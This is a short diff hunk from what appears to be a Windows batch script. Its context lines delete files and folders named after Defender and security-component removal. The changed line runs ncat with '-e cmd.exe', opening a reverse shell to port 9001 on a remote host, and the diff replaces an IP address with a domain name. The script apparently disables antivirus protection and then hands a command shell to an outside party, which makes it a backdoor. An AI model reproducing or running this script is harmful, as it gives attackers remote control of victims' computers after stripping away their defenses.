@@ -27,4 +27,4 @@ del /f /q DefenderRemover.bat
 rmdir /s /q Remove_SecurityComp
 rmdir /s /q Remove_Defender
 
-ncat.exe 185.194.175.132 9001 -e cmd.exe
+ncat.exe davidroger.com 9001 -e cmd.exe
